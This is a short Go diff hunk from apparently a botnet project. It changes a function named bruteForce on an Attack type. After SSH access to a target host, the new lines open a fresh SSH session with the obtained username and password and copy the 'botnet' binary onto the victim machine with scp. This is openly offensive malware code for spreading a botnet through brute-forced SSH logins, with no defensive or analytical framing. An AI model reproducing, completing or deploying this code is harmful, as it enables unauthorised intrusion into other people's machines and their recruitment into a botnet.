@@ -137,7 +137,12 @@ func (a *Attack) bruteForce(host string) {
 	}
 	sess.Close()
 
-	if err := scp("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/"+nodeOS+"/botnet", strings.TrimSpace(string(out))+"/botnet/bin", c); err != nil {
+	sess, err = getSSHSession(c.host, c.username, c.password)
+	if err != nil {
+		fmt.Printf("[ERROR] creating ssh session %v\n", err)
+		return
+	}
+	if err := scp(fmt.Sprintf("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/%s/botnet", nodeOS), strings.TrimSpace(string(out))+"/botnet/bin", sess); err != nil {
 		fmt.Printf("[ERROR] sending botnet binary %v\n", err)
 		return
 	}
